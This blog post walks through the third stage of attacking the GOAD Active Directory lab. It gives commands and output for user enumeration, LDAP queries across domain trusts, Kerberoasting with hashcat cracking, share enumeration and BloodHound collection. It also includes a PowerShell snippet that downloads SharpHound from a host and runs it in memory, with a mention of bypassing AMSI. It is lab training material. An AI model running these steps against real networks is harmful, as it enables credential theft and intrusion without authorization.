---
layout: post
title:  "GOAD - part 3 - enumeration with user"
category : AD
tags :  AD, Lab, cme, kerberoasting, impacket, ldap, bloodhound
---

We found some users on [Goad pwning part2]({% link _posts/2022-07-04-GOADv2-pwning-part2.md %}), now let see what we can do with those creds.

## User listing

![mindmap_got_creds.png](/assets/blog/GOAD/mindmap_got_creds.png)

- When you get an account on an active directory, the first thing to do is always getting the full list of users.
- Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).


```bash
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2022-06-29 00:32:20.901897  2022-07-01 17:48:41.983605 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 13:38:55.922520  2022-07-01 12:08:35.223885 
krbtgt                                                2022-06-29 00:48:58.950440  <never>             
arya.stark                                            2022-06-29 07:48:08.060667  2022-07-03 17:40:06.721358 
eddard.stark                                          2022-06-29 07:48:11.560625  2022-07-04 23:33:27.976702 
catelyn.stark                                         2022-06-29 07:48:15.013735  <never>             
robb.stark                                            2022-06-29 07:48:18.544972  2022-07-04 23:35:50.678794 
sansa.stark                                           2022-06-29 07:48:21.607059  <never>             
brandon.stark                                         2022-06-29 07:48:24.278459  2022-07-04 23:36:08.991489 
rickon.stark                                          2022-06-29 07:48:26.966809  <never>             
hodor                                                 2022-06-29 07:48:29.670052  2022-07-04 23:21:58.774078 
jon.snow                                              2022-06-29 07:48:32.373101  2022-07-03 17:36:26.798060 
samwell.tarly                                         2022-06-29 07:48:35.107476  2022-07-01 16:35:17.043960 
jeor.mormont                                          2022-06-29 07:48:37.841846  <never>             
sql_svc                                               2022-06-29 07:48:40.248028  2022-07-03 15:56:57.924607
```

- With ldap query, i recommand this article with all the usefull ldap query for active directory : [https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

- With ldap on north.sevenkingdoms.local

```shell
ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```

![ldap_search.png](/assets/blog/GOAD/ldap_search.png)


- With ldap query we can request users of the others domain because a trust is present.

- On essos.local

```shell
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
```

- On sevenkingdoms.local

```shell
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"
```

## Kerberoasting

- On an active directory, we will see very often users with an SPN set.

- let's find them with impacket

```shell
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114
```

All the hashes will be stored on the file kerberoasting.hashes

- we could also do that with cme with the following command :

```shell
cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```

- Now let's try to crack the hashes :

```shell
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

- we quickly get a result with rockyou :

![hashcat_cme_kerberoasting.png](/assets/blog/GOAD/hashcat_cme_kerberoasting.png)

- And we found another user : north/jon.snow:iknownothing

## share enum
- we got a domain user so we could enumerate the share another time but with a user account

```shell
cme smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

![cme_smb_share_domain_users.png](/assets/blog/GOAD/cme_smb_share_domain_users.png)

- Now a new share folder is readable (nothing in it on the lab, but on a real assignment you will get very often juicy informations)

## Bloodhound

- Boodhound is one of the best tool for an active directory pentest. This tool will help you to find all the path to pwn the AD and is a must have in your arsenal !

- To launch bloodhound you first need to retreive all the datas from the differents domains.

### Python ingestor - from linux
- First we will get the datas with the python ingestor : [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

- Let's run the script on north.sevenkingdoms.local :

```shell
bloodhound.py --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local
```

![bloodhound_python_ingestor.png](/assets/blog/GOAD/bloodhound_python_ingestor.png)

Ok now, we get all the informations from the domain north.sevenkingdoms.local. Now try to get the informations for other domains :

```shell
bloodhound.py --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local
```

```shell
bloodhound.py --zip -c All -d essos.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc meereen.essos.local
```

![bloodhound_other_domains.png](/assets/blog/GOAD/bloodhound_other_domains.png)

- We now got the 3 domains informations :)

- but the python ingestor is not as complete as the .net ingestor as we can see on the github project : _"Supports most, but not all BloodHound (SharpHound) features (see below for supported collection methods, mainly GPO based methods are missing)"_

- So let's do that again from Windows this time.

### .net ingestor - from Windows

- The official bloudhound ingestor is sharphound : [https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound)

- Let's start an RDP connection

```shell
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
```

- The C:\vagrant folder is automatically mounted on the vm it will simplify file transfert
- we will launch sharphound to retreive domains informations

```shell
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
```

![sharphound_rdp.png](/assets/blog/GOAD/sharphound_rdp.png)

- Or we could also do it in reflection with powershell if you want to play it full in memory (if you do this with defender enabled you will first have to bypass amsi)

```psh
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
```

### Hunting with bloodhound

- Now start neo4j and bloodhound (at the time of writing the python ingestor match bloodhound 4.1 be sure to get the right version)
- Upload the zips into bloodhound
- And now show all domains and computer

```
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
```

![domain_computers.png](/assets/blog/GOAD/domain_computers.png)

- And show all the users

```
MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
```

![bh_users.png](/assets/blog/GOAD/bh_users.png)

- let see the overall map of domains/groups/users

```
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
```

![domain_computers.png](/assets/blog/GOAD/bloddhound_domaingroupsusers.png)


- Let see the users ACL

```
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```

![bloodhound_acl.png](/assets/blog/GOAD/bloodhound_acl.png)

- If you want to dig more i recommand the following article with a lot of usefull informations and queries : 
    - [https://en.hackndo.com/bloodhound/](https://en.hackndo.com/bloodhound/)
    - [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

On the next article we will start to play with poisoning and ntlm relay : [Goad pwning part4]({% link _posts/2022-07-12-GOADv2-pwning-part4.md %})